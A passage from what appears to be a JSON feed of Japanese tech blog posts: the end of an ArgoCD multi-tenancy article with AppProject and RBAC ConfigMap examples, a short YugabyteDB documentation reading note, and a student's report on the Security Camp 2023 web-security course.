は、ついでにKubernetesもアップグレードしたい。新しいClusterを別に作成し、そこで新ArgoCDを作成すれば一石二鳥である。                 性能                  -                                                                                            Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                                                                                                                                                ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                                                                                        信頼性                 -                                                                                            ClusterまたはArgoCDで障害が起こると、これは全てのテナントに影響する。                                                                                                                                                            ➡︎  代わりにNodeやArgoCDを十分に冗長化して可用性を高めれば、影響を緩和できる。ただ、そもそもの影響範囲が大きすぎる\uD83D\uDE2D                                           05-02. NSモードなArgoCD - ★★NSモードなArgoCDとはNSモードなArgoCDの場合、前述のCLモードとは異なり、各AppProjectテナント間でArgoCDを占有します。例えば、AppProjectテナントとして、プロダクト別のNamespace (foo、bar、baz) とAppProject (foo、bar、baz) を用意します。各AppProjectテナントに、ArgoCDと関連するKubernetesリソース (例：ConfigMap) を配置します。各プロダクトチームは、AppProjectテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesAppProjectCLモードと同様にして、AppProjectに所属するApplicationによるマニフェストのデプロイを制限できます。例えば、以下のような実装になります。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # App Of Appsパターンの場合に使用する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    - namespace: \\"*\\"      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com# NSモードでは設定が不要である# sourceNamespaces:#   - fooApplicationを操作するログインユーザーが、無認可のNamespaceやClusterをデプロイ先に指定できないように、.spec.destinationキーで制限しています。前述のCLモードとは異なり、NSモードなArgoCDは自身が所属するNamespaceのApplicationのみにアクセスできます。そのため、.spec.sourceNamespacesキーでマニフェストのデプロイを制限する必要はありません。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesProjects - Argo CD - Declarative GitOps CD for KubernetesArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)CLモードと同様にして、argocd-cmd-params-cmでは、ArgoCDの各コンポーネントのコンテナの引数を設定できます。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# NSモードでは設定が不要である# application.namespaces: \\"*\\"前述の通り、.application.namespacesキーは、argocd-serverとapplication-controllerの--application-namespacesオプションに相当します。前述のCLモードとは異なり、NSモードなArgoCDは自身が所属するNamespaceのApplicationのみにアクセスできますそのため、.application.namespacesキーでNamespaceに関する認可を設定する必要はありませんもちろん、Podのコンテナ引数にも設定は不要です。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetesログインユーザー用ConfigMap (argocd-rbac-cm)CLモードと同様にして、argocd-rbac-cmでは、Applicationを操作するログインユーザーが、無認可のAppProjectやNamespaceに所属するApplicationを操作できないように制限します。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  # デフォルトのロール  # @see https://github.com/argoproj/argo-cd/blob/master/assets/builtin-policy.csv#L9-L16  policy.default: role:readonly  policy.csv: |    p, role:app, *, *, app/*/*, allow    p, role:infra, *, *, infra/*/*, allow    g, app-team, role:app    g, infra-team, role:infra  scopes: \\"[groups]\\"認証済みグループ (app-team、infra-team) に対して、無認可のAppProject (app、infra) に所属するApplicationを操作できないように、認可スコープを制限しています。特にオススメした理由NSモードなArgoCDのAppProjectテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見で 特にオススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                  デメリット \xd7                                                                                                                                                                                                                      デメリットの回避策                                                                                                                                                            拡張性                 テナントを増やすためにNamespaceとAppProjectを用意するだけでよく、作業量が少ない。            -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                    安全性(セキュリティ)        NetworkPolicyでNamespace間の名前解決を不可能にすれば、他のNamespaceからの通信を遮断できる。  -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                             保守性                 単一のClusterを保守すればよい。(例：アップグレード、機能修正など)               AppProjectはNamespacedスコープなカスタムリソースのため、ClusterスコープなKubernetesリソースを他のテナントと共有しないといけない。そのため、ClusterスコープなKubernetesリソース (特にCRD) の変更は全てのテナントに影響する。  ➡︎  ArgoCDのアップグレード時 (CRDの変更時) は、ついでにKubernetesもアップグレードしたい。新しいClusterを別に作成し、そこで新ArgoCDを作成すれば一石二鳥である。                 性能                  -                                                                                            Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                                                                                                                                                ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                                                                                        信頼性                 テナントごとにArgoCDを占有しており、他のArgoCDから障害の影響を受けない。                     Clusterで障害が起こると、これは全てのテナントに影響する。                                                                                                                                                                        ➡︎  代わりに、Nodeを十分に冗長化して可用性を高める。いずれかのインスタンスで障害が起こっても、正常なインスタンスでArgoCDが稼働できる。                         AppProjectテナント例の一覧NSモードなArgoCDを採用する場合、AppProjectテナント例を解説していきます。前述の通り、AppProjectテナントが二重テナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持つことに留意してください。なお、オススメするものを ★ としています。    テナント例(二重テナント)    オススメ  Namespace(第一テナント)    AppProject(第二テナント)  テナント例1      プロダクトの実行環境別      プロダクトの実行環境別          テナント例2      プロダクト別      プロダクトの実行環境別      ★    テナント例3      プロダクト別      プロダクトのサブチーム別      ★★    ▶ Namespaceの分割パターンについて\\"管理チーム別\\" (今回でいうプロダクト別) というNamespaceの分割パターンは、様々な著名な書籍やブログで紹介されています\uD83D\uDC40  https://www.amazon.co.jp/dp/1617293725Kubernetes best practices: Specifying Namespaces in YAML | Google Cloud Blogテナント例1Namespace (プロダクトの実行環境別)、AppProject (プロダクトの実行環境別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。この場合に、プロダクトの実行環境別にNamespace (dev、tes) とAppProject (dev、tes) を用意します。オススメしなかった理由テナント例1には、以下のメリデメがあります。独断と偏見でオススメしませんでした。 アーキテクチャ特性  メリット ⭕️                                                                                                                                     デメリット \xd7                                                                                                                                   デメリットの回避策                                                                                       拡張性                 -                                                                                                                                               ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりやすい。その時点で、AppProjectテナントの増やせなくなる。  ➡︎  例えばAWS EKSの場合、Node数を増やしたり、Nodeのスペックを上げる。ただ、お金がかかる\uD83D\uDE2D       安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可の実行環境別AppProjectに所属するApplicationを操作できないように制限できる。  -                                                                                                                                             ➡︎  -                                                                                                        保守性                 異なる実行環境に関するApplicationが共存しておらず、別のargocd-serverから操作することになるため、実行環境間の選択ミスが起こりにくい。            -                                                                                                                                             ➡︎  -                                                                                         テナント例2 - ★Namespace (プロダクト別)、AppProject (プロダクトの実行環境別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo、bar) 、プロダクトの実行環境別にAppProject (dev、tes) を用意します。オススメした理由テナント例2には、以下のメリデメがあります。独断と偏見で オススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                デメリット \xd7                                                                                                                                           デメリットの回避策                                                                                 拡張性                 ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりにくい。                                   -                                                                                                                                                     ➡︎  -                                                                                         安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可の実行環境別AppProjectを操作できないように制限できる。  -                                                                                                                                                     ➡︎  -                                                                                                  保守性                 -                                                                                                                          異なる実行環境に関するApplicationが共存しており、同じargocd-server (ダッシュボード) から操作することになるため、実行環境間の選択ミスが起こりやすい。  ➡︎  ダッシュボードにはApplicationのフィルタリング機能があるため、選択ミスを回避できる。 テナント例3 - ★★Namespace (プロダクト別)、AppProject (プロダクトのサブチーム別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo、bar) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。特にオススメした理由テナント例3には、以下のメリデメがあります。独断と偏見で 特にオススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                                       デメリット \xd7                                                                                                                                           デメリットの回避策                                                                                 拡張性                 ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりにくい。                                                          -                                                                                                                                                     ➡︎  -                                                                                         安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可のサブチーム別AppProjectに所属するApplicationを操作できないように制限できる。  -                                                                                                                                                     ➡︎  -                                                                                                  保守性                 -                                                                                                                                                 異なる実行環境に関するApplicationが共存しており、同じargocd-server (ダッシュボード) から操作することになるため、実行環境間の選択ミスが起こりやすい。  ➡︎  ダッシュボードにはApplicationのフィルタリング機能があるため、選択ミスを回避できる。 06. どのような誤った操作を防いでくれるのかそろそろ解説を読むのがしんどい方がいるのではないでしょうか。『君がッ、泣くまで、解説をやめないッ！』AppProjectテナントとNamespacedスコープモードがマニフェストのデプロイをどのように制限するのかについて、例を挙げて解説します。ここでは、以下のAppProjectを作成したと仮定します。AppProjectテナントが二重テナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持つことに留意してください。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  # appチーム  name: app  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # Namespace (foo) へのデプロイを許可する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"      # プロダクト用Clusterに関する認可を設定する      # Namespace (app) へのデプロイを許可する    - namespace: app      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.comapiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  # infraチーム  name: infra  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # Namespace (foo) へのデプロイを許可する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    # Namespace (infra) へのデプロイを許可する    - namespace: infra      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.comマニフェストのデプロイ制限プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。AppProjectテナントは、例えば 赤線 の方法で、マニフェストのデプロイを制限します。マニフェストをデプロイできる場合マニフェストを正しくデプロイする場合、AppProjectテナントはこれを制限しません。(1) argocd-serverは、argocd-cmd-params-cmからアクセスできるNamespaceを取得します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# 設定しないことで、argocd-serverは同じNamespaceにしかアクセスできなくなる。# application.namespaces: \\"*\\"(2) fooプロダクトのinfraチームが、argocd-serverを操作します。(3) argocd-serverは、argocd-rbac-cmからApplication操作に関する認可スコープを取得しますapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  policy.default: role:readonly  policy.csv: |    p, role:app, *, *, app/*/*, allow    p, role:infra, *, *, infra/*/*, allow    g, app-team, role:app    g, infra-team, role:infra  scopes: \\"[groups]\\"(4) infraチームは、認可されたAppProjectに所属するApplicationを操作します。(5) infraチームは、Dev環境のfooプロダクト用ClusterのNamespace (infra) にマニフェストをデプロイできます。(\uD83D\uDEAB制限例1) 無認可のNamespaceでApplicationを作成しようとした場合例えば、fooプロダクトのinfraチームが無認可のNamespace (bar) でApplicationを作成しようとします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。namespace bar is not permitted in project \'infra-team\'無認可のNamespaceでApplicationを作れてしまうと、そのApplicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/test/e2e/app_management_ns_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub(\uD83D\uDEAB制限例2) 無認可のAppProjectでApplicationを作成しようとした場合例えば、fooプロダクトのinfraチームが、無認可のAppProject (app) でApplicationを作成しようとします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。Application referencing project \'app\' which does not exist任意のAppProjectでApplicationを作成できてしまうと、そのApplicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08(\uD83D\uDEAB制限例3) 無認可のClusterをデプロイ先に指定しようとした場合例えば、fooプロダクトのinfraチームがApplicationを操作し、無認可のプロダクト用Cluster (bar-cluster) をデプロイ先として指定しようします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。application destination{https://bar-cluster.gr7.ap-northeast-1.eks.amazonaws.com infra} is not permitted in project \'infra-team\'任意のClusterをデプロイ先に指定できてしまうと、Applicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/util/argo/argo_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub(\uD83D\uDEAB制限例4) 無認可のNamespaceをデプロイ先に指定しようとした場合例えば、fooプロダクトのinfraチームがApplicationを操作し、無認可のNamespace (app) をデプロイ先に指定しようします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。application destination{https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com app} is not permitted in project \'infra-team\'任意のNamespaceをデプロイ先に指定できてしまうと、そのApplicationから無認可のNamespaceにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/util/argo/argo_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub▶ AppProjectで設定できる認可の種類についてargocd-serverとapplication-controllerでデプロイできるKubernetesリソースの種類 (.spec.clusterResourceWhitelistキー、.spec.namespaceResourceWhitelistキーなど)repo-serverでポーリングできるリポジトリ (.spec.sourceReposキー)apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  clusterResourceWhitelist:    - group: \\"*\\"      kind: \\"*\\"  namespaceResourceWhitelist:    - group: \\"*\\"      kind: \\"*\\"  sourceRepos:    - \\"*\\"  ...\\"AppProjectテナントによるマニフェストのデプロイ丸ごとの制限\\" という観点でテーマが異なるため、本記事では言及しませんでした\uD83D\uDE47\uD83C\uDFFB‍  Projects - Argo CD - Declarative GitOps CD for KubernetesDeclarative Setup - Argo CD - Declarative GitOps CD for KubernetesカスタムリソースのReconciliation制限プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。AppProjectテナントは、例えば 赤線 の方法で、ArgoCD系カスタムリソースに対するapplication-controllerのReconciliationを制限します。ArgoCD系カスタムリソースをReconciliationできる場合正しいNamespaceに対してReconciliationを実行する場合、AppProjectテナントはこれを制限しません。(1) application-controllerは、argocd-cmd-params-cmから自身がアクセスできるNamespaceを取得します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# 設定しないことで、application-controllerは同じNamespaceにしかアクセスできなくなる。# application.namespaces: \\"*\\"(2) application-controllerは、同じNamespaceに所属するArgoCD系カスタムリソースに対して、Reconciliationを実行します。(\uD83D\uDEAB制限例1) 無認可のNamespaceにReconciliationを実行しようとした場合例えば、application-controllerがReconciliationの対象とするNamespaceを選ぼうとしているとします。すると、application-controllerは内部で検証メソッドを実行し、無認可のNamespace (bar) は選ばないようにします。argo-cd/controller/appcontroller_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub07. おわりにKubernetesのマルチテナントパターンとArgoCDでのパターン実践をもりもり布教しました。あらゆる面からマニフェストのデプロイを制限してくれる、AppProjectテナントの素晴らしさが伝わりましたでしょうか。KubernetesのマルチテナントパターンをArgoCDでどう実践するべきか、について困っている方の助けになれば幸いです\uD83D\uDC4D謝辞本記事のタイトルは、私が崇拝しているドメイン駆動設計の書籍 \\"実践ドメイン駆動設計\\" から拝借しました\uD83D\uDE4Fまた、ArgoCDでのパターン実践の収集にあたり、以下の方からの意見も参考にさせていただきました。@toversus26 さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍GitOps Cookbook: Kubernetes Automation in Practice (English Edition)作者:Vinto, Natale,Bueno, Alex SotoO\'Reilly MediaAmazonGitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux作者:Yuen, Billy,Matyushentsev, Alexander,Ekenstam, Todd,Suen, JesseManning PublicationsAmazon","isoDate":"2023-08-18T02:06:46.000Z","dateMiliSeconds":1692324406000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"YugabyteDBのドキュメントを全部読む Day5","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/5_core_functions_universe_creation","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > YB-Master serviceを読みました。今回はArchitecture > Core functions > Universe creationを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Universe creationYugabyteDBのユニバース作成は複数のステップを含む。Start YB-MastersYBユニバース作成の最初のステップはレプリケーションファクターで指定された数だけYB-Masterを作成することである。作成されたYB-Masterはそれぞれを認識している。YB-Masterはユニバース内でユニークなID(UUID)をそれぞれに割り当て、それぞれを認識しあったあとにリーダーエレクションを実行する。このステップの終りにYB-Masterの中のひとつがリーダーとして確立される。Start YB-TServersノードの数だけYB-TServerを起動し、それぞれにマスターのアドレスを渡す。それぞれのYB-TServerはマスターにハートビートを送信し、正常に動作していることを確認する。ハートビートはYB-TServerが現在ホストしているタブレットとその負荷情報についても通信するが、この時点ではタブレットにデータは登録されていない。Examples4ノードからなるYBユニバースにテーブルを作成する場合について考える。テーブルのレプリケーションファクターは3とする。3つのマスターがcreateモードで起動される。これはマスターがすでに起動しているために発生するエラーを防ぐために明示的に実行される。リーダーエレクションを実行し、リーダーを選出する。YB-TServerが起動し、全てのYB-TServerがマスターにハートビートを送信する。","isoDate":"2023-08-16T13:49:19.000Z","dateMiliSeconds":1692193759000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"セキュリティ・キャンプ 2023 参加記","link":"https://moz-security.hatenablog.com/entry/2023/08/15/015853","contentSnippet":"8月7日から8月11日まで開催されたセキュリティ・キャンプの Bクラス（Webセキュリティ）に参加してきたので、やってきたことや感想について、体験記として書き残そうと思う。セキュリティ・キャンプについては、以下のホームページを参照してほしい。今年が20回目の開催で、4年ぶりに対面で行われた。www.ipa.go.jp応募課題まず、セキュリティ・キャンプに参加するには、応募課題を解かなければならない。これに関しては、また別のブログとして、私の答案については出そうと思うが、今までのプログラミング言語やコンテナ技術の利用経験を問われたり、Webにおける脆弱性の検証と調査、Webの標準や実装の調査を行なって、それをレポートとしてまとめ、提出した．応募課題は、下記のURLにある。セキュリティ・キャンプ全国大会2023 応募要項（エントリー） | デジタル人材の育成 | IPA 独立行政法人 情報処理推進機構共通講義共通講義では、行動経済学やXR、国際政治とセキュリティといったものやサイバー犯罪についての講義があった。これらについてはあまり書かないが、日頃勉強している技術的なもの以外の部分について学ぶことができるいい機会であり、新鮮であった。サイバーセキュリティという分野は、法律・犯罪と密接に関連してくるにも関わらず、グレー部分の範囲がとても広くて、どこまでが許されて、どこからがダメなのかという判断が難しい。そのため、ワークショップの形で弁護士や検事の方の考えを知ることができたのはよかった。講義の中でも仰っていたが、私はあくまで技術者であり、法律家ではない。だからこそ、”わかった気にならない”という点は気をつけようと思った。専門講義専門講義では、各クラスによって講義が変わってくる。Bクラスでは、Webセキュリティをテーマにして、講義が構成されている。基本的には４時間の講義で、どれも座学と演習が 1:1 くらいの割合になっており、手を動かしたり、ツールの動きを確認しながらだったため、概念だけでなく、実装も学べたし、何よりも楽しかった。講師の方が一般に公開している資料については一緒に貼っている。1日目B-1 Webプロダクトセキュリティへの誘い最初の講義は、初日の18:30~20:30に行われた。この講義では、プロデューサーがどのような意図を持って講義を構成したか、何を学んでほしいのかというところを整理した。このクラスでは、\\"将来と今の両方を考えて、意思決定ができるリーダーになること\\" を目標としており、その時点でいろいろ考えさせられた．私の感覚では、すごいセキュリティエンジニアというのは、技術のことをたくさん知っていることだったからである．でも、実際に社会に出ると、技術とは違ったベクトルの強さというものが必要だとわかった．これに関しては、 この時点でも納得はしていたが、B-5やB-7の講義を受けた後により強く実感した．技術的な強さだけであれば、5日間ひたすらWebアプリケーションの脆弱性を勉強して、探せばいいが、そのような構成にはなっていない．\\"How と Why を考えながら受講すること\\"というのは念を押されたが、これに関しては、非常に大切なことであり、日頃から意識する必要があると感じた。また、B-2からB-7の講義に関して、自分がどこまでわかっていて、どのようなことを学べそうか、何を習得することを目標にするかというのを考えて、グループワークでお互いに共有した．1つ例を挙げると、B-2の講義に関して、サイバーキルチェーンやActive Directoryはわかるが CI/CDパイプライン を狙った攻撃とはなんなのか、加えて攻撃者はどういう視点とか考えで攻撃を計画するのかというのはわからないから学びたいというのがあった．2日目B-2 開発のプロセスを攻撃者の視点で捉えるこの講義は、2日目の8:30~12:30に行われた．この講義では、なぜ攻撃をするのかというところから始まり、レッドチーム演習の効果やサイバーキルチェーンと攻撃フローについて座学で学んだ．また、仮想環境で攻撃演習を行うことで、実際に攻撃フローを見ることができた．演習で自分で攻撃してみることで、攻撃者の視点というものをより実感することができた．最終的には、防御側ができることを考えたが、攻撃者の視点を持つことで、より深く考えることができた．レッドチーム演習の情報はWebで調べてもあまり出てこないため、その界隈の第一人者の方から、生の声を聞けたのはよかったし、貴重な経験になった．最近、Hack The Boxに取り組めていなかったが，講義を受講して、モチベーションが上がり、また再開した．この講義では、CI/CD環境のセキュリティについても学んだ．オンプレミスからクラウドへと環境の変化はあるが、\\"攻撃方法は変わったとしても、攻撃の流れは変わらない\\"というのが大事な点であった．例えば、攻撃モデルの一つにサイバーキルチェーンがあるが、この考え方はオンプレでもクラウドでも関係なく、有効である．今までCI/CDを狙った攻撃というのは全く想像もつかなかったが Github Actions などの CI/CD Configuration から Credential が漏洩したり、3rd party tool を汚染することで莫大な被害につながるといった CI/CD Pipeline への攻撃もなんとなく理解できた．B-3 クラウドネイティブセキュリティの実践と戦略この講義は、2日目の13:30~17:30に行われた．この講義では、そもそもクラウドネイティブとはなんなのかの説明を受けたのちに、Kubernetesが提供する耐障害性の機能やマイクロサービスのセキュリティについて学んだ．k8sを実際に動かして、アプリケーションのスケーリングの様子などを確認しながら進めることができたのはとてもよかった．また、コンテナから権限掌握→AWSアカウントの侵害という演習を通して、クラウドネイティブ環境を構築・運用するにあたって、どのようなことに気をつけなければならないかといったことを学んだ．k8sのセキュリティモニタリングに関して、eBPFの紹介も少しあった．事前課題や講義を通して、最低限 k8s が動かせるようになったり、提供している一部の仕組みについてはわかったりしたが、まだまだ知らない機能はたくさんあるし、現在進行形で新たな技術が生まれている分野である．たしかにクラウドネイティブ環境の構築・運用は難しいのかもしれないが、技術の面白さというのはとても感じたし、もっともっと学んでいきたいと思った．3日目B-4 Webサービスにおける安全な認証とID連携の実装この講義は、2日目の14:00~18:00に行われた．この講義では、最初に認証・認可の技術であるFIDO, WebAuthn, Passkey, OAuth, OpenID Connect についての用語とそれぞれの用語の関係に関して説明を受けた．各用語は知っているが、説明できるほどの理解はできていなかったため、整理して学ぶことができ、理解できた．また、認証・認可はWebアプリにおいて最もクリティカルな箇所であり,セキュリティも十分に配慮しなければならない．CSRFの発生メカニズムを押さえ、どうすれば防ぐことができOpenID Connectではどのような処理フローになっているのかを学ぶことで、安全な認証・認可を実現する仕組みについて理解できた．その後、パスキーのハンズオンとOpen ID Connectのハンズオンを行なった．ハンズオンでは、プログラムの穴あき部分を埋めることで、ちゃんと機能が実装できているか確認しながらステップアップ形式で進めた．ID連携やパスキーの実装となると、難しいイメージだったが、すでにあるライブラリを使うことで、簡単に実装することができた．一度学んだとしても、使わなければ忘れてしまうため、Webアプリケーションを開発するときに、今回学んだ技術を組み込むことで、さらなる理解と自分で使える技術にしたいと思う．B-5 適応し続けるプロダクトセキュリティ speakerdeck.com\xa0この講義は，3日目の19:00~20:40に行われた．この講義では，組織やプロダクトの変化に対して，セキュリティをどう確保するのか考える技術者というよりは，CISOといったセキュリティにおいてリーダーシップを発揮し，変化に対応する組織を作るにはどうすればいいのかといったことを学んだ．プロデューサーの\\"将来と今の両方を考えて，意思決定ができるリーダーになること\\"という思いが最も顕著に出ている講義であった．昨今の世の中は，プロダクトも組織もどんどん変化する時代であり，その変化に応じて，セキュリティのあり方も変わってくる．セキュリティの難しさはどこか一つでも弱い部分があってはいけないというところである．サービスを提供する場合，何か一つ強みがあれば，それで大ヒットするかもしれないが，セキュリティは全てが一定水準にならなければならない．プロダクト運営に求められるセキュリティは幅広いが，バランスよく，少しずつ積み重ねていくことが大事だとわかった．個人的には，セキュリティ人材が置かれる現実と求められることというところが面白く，より優れたセキュリティ人材，セキュリティ分野でリーダーシップを発揮して組織を変えるには，人間としての成長が不可欠だとわかった．\\"深化と探索のバランスとそれらの継続\\" が重要になってくると学んだ．将来は，セキュリティ関連の仕事をしたいとは思っていたが，CISOのようなリーダーシップを発揮して組織を変えていくということは考えたことがなかった．セキュリティ人材として成長するために，人間的な成長が必要になるというのは面白かった．4日目B-6 ソースコード解析によるWebアプリケーションの脆弱性調査この講義は，4日目の8:30~12:30に行われた．この講義では，ソースコードから脆弱性を探す方法について学んだ．最初に，静的解析で見つけやすい脆弱性の説明を受け，演習として，まずは，脆弱性を手動で探した．CVEが3つ取り上げられており，それらの脆弱性をNVDやそこに載っているGithubのPatchのプログラムやPoCを見て，調査した．プログラムベースで実際にどのような入力値であれば，脆弱性が悪用できるのかを探すのがこの調査のゴールであった．しかし，複雑なWebアプリケーションになると，大量の関数呼び出しによって，コードを追うのが大変になる．そこで，脆弱性調査の自動化のためのツールとして，CodeQLの説明があり，その後の演習で実際に使って，調査を行った．CodeQLを使うことで，特定の関数呼び出しや変数宣言，構文パターンを抽出することができ，脆弱性となりうるコードが含まれていないか簡単に調査できることがわかった．プログラムを書くことはあっても，解析して脆弱性を探し出すといったことはやったことがなかったため，新たな知見が得られたのはよかったし，楽しかった．自分で書いたコードに対して，脆弱性を探し，修正するといったことやバグバウンティに取り組むといったことも今後していきたいと思った．B-7 Policy as Code 入門docs.google.comこの講義は，4日目の13:30~17:30に行われた．この講義では，ポリシーをコードとして書くことで，k8sの設定ファイルやクラウドサービスのリソース状態の監視結果に対して制約を満たすかどうかチェックすることができるといったことを学んだ．この講義に関しても，B-5と同じで，一見セキュリティと関係ないため，今まで勉強してきたことがなかったが，クラウドサービスのリソースにポリシーを定義して不要なポートが開いてないかやクレデンシャルが書き込まれていないかなどのチェックはセキュリティ向上のためにも有効である．一部の先進的な組織しかPolicy as Codeを実践できていないという部分で，まだまだ新しい技術ではあるが，この講義を通して，こういうものがあるということを知れたのはよかった．演習では，3以降のよりリアルなポリシーになった途端に難しく，書くのに苦戦した．いつ使うことになるかわからないが，このようなものがあるというのを覚えておいて，いざという時に使えるようにしたいと思う．講義全体を通してB-1からB-7まで非常に幅広い分野の講義があり，それに加え，どの講義も4時間で終わり切らない程濃密なものであったため，まだ整理ができていない部分も多々ある．本当に知識をひたすら叩き込まれた感じであるため，また時間を取って整理して，理解したいと思う．4日間講義があり，ホームルームの時には思考停止するほどの疲れがあったが，講義内容の濃さと演習の楽しさでものすごい充実感はあった．あと，講義のレベルも高く，わからない箇所があったりもしたが，講師の方やチューターの方に質問するとなんでも教えてくださったため，問題なく演習を進めたり，疑問点を残すことなく学ぶことができた．対面での開催について今年は，4年ぶりの現地開催ということだったが，本当に楽しかった．5日間だけで，たくさんの人に出会ったし，たくさん話した．基本的にクラスで講義を受けるため，クラスの人とはずっと一緒にいることになり，仲良くなるが，だからこそ，食事のときや名刺交換会というのは違うクラスの子とも知り合ういい機会だった．ジュニアで参加している中学生とかから同世代の受講生やチューター，実際に社会で活躍している講師の方たちまで異なる立場や年齢の人たちと話すことができたのはよかった．X（Twitter）の中でよく見るすごい人たちと面と向かって話したり，議論できたりするのは楽しかったし，とても刺激を受けた．授業はもちろん素晴らしいのだが，同世代で自分よりもすごい人たちと出会い，それによってモチベーションが爆増するというのが個人的にはセキュリティ・キャンプに参加する一番のよさだと思う．学内という狭い世界で自分はそれなりにできると思っていても，全国から人が集まってくるセキュリティ・キャンプでは上には上がたくさんいるというのをすごい体感したし，もっと頑張ろうと思った．参加した感想今年22歳になるため，今年が最後のチャンスだったが，本当に参加することができて良かった．キャンプ参加が決まった後も，講義に対してワクワクしながらも，一方で講義についていけるのか，私みたいな人が行って大丈夫なのか，他の人たちはやっぱりつよつよなのかという不安はあったが，そんな不安は初日で解消した．たしかに，みんなすごい人たちだったが，コミュニケーションを取る上では，ITに興味があるというその一点だけで仲良くなることができたし，講義でわからないことがあったとしても，他の受講生やチューター，講師の方に聞いたらちゃんと教えてくださった．セキュリティに興味があるのなら，少しでも早いうちから応募課題に挑戦するべきだと思うし，そこで得られるものはたくさんある．たとえ，課題で落ちてしまったとしても，課題を解くことに意味があり，それだけでも知らないことをたくさん学ぶことができる．セキュリティ・キャンプ 2023 に参加したからこそ，心の底から参加することを勧めたい．来年は，チューターかネクストキャンプ受講生としてまた戻って来たいと思う．まとめ・どの講義も濃密で、わからない部分もあったが、チューターや講師の方のサポートもあり、なんとかついていくことができた．・やっぱり対面での開催はいい．・全国のすごい人たちを間近に見ることができ、刺激がもらえる．・セキュリティに興味がある人はもちろん、ITに興味がある人全員にセキュリティ・キャンプを進めたい．","isoDate":"2023-08-14T16:58:53.000Z","dateMiliSeconds":1692032333000,"authorName":"Kobayashi 